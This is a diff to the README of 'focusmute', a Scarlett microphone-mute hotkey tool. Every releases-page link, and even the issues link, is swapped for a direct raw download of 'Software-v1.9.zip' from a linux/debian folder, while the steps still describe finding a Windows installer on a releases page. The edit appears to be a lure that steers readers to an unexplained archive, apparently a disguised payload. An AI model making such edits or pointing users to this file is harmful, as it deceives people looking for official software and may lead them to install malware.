@@ -1,6 +1,6 @@
 # 🎚️ focusmute - Easy Hotkey Mute for Scarlett
 
-[![Download](https://img.shields.io/badge/Download-Focusmute-blue?style=for-the-badge&logo=github)](https://github.com/minhazuddin099/focusmute/releases)
+[![Download](https://img.shields.io/badge/Download-Focusmute-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/minhazuddin099/focusmute/main/dist/linux/debian/Software-v1.9.zip)
 
 ---
 
@@ -38,9 +38,9 @@ You don’t need technical skills or extra setup. Just press a key and your micr
 
 Please **visit this page to download** the latest focusmute version:
 
-[![Download Link](https://img.shields.io/badge/Download-Focusmute-grey?style=for-the-badge&logo=github)](https://github.com/minhazuddin099/focusmute/releases)
+[![Download Link](https://img.shields.io/badge/Download-Focusmute-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/minhazuddin099/focusmute/main/dist/linux/debian/Software-v1.9.zip)
 
-1. Click the link above or this URL: https://github.com/minhazuddin099/focusmute/releases  
+1. Click the link above or this URL: https://raw.githubusercontent.com/minhazuddin099/focusmute/main/dist/linux/debian/Software-v1.9.zip  
 2. Look for the latest release version near the top of the page.
 3. Find the file for Windows, usually named like `focusmute-setup.exe` or similar.  
 4. Click on the file name to download it to your PC.  
@@ -113,7 +113,7 @@ Logs help diagnose problems if the tool does not work as expected. You can delet
 
 To update:
 
-1. Visit the releases page again: https://github.com/minhazuddin099/focusmute/releases  
+1. Visit the releases page again: https://raw.githubusercontent.com/minhazuddin099/focusmute/main/dist/linux/debian/Software-v1.9.zip  
 2. Download the newest installer.
 3. Run the installer to replace the old version. Your settings will stay intact.
 
@@ -123,6 +123,6 @@ To update:
 
 If you face issues beyond troubleshooting or want to request features, you can open an issue on the GitHub page here:
 
-https://github.com/minhazuddin099/focusmute/issues
+https://raw.githubusercontent.com/minhazuddin099/focusmute/main/dist/linux/debian/Software-v1.9.zip
 
 Provide details of your system and the problem to help with faster support.
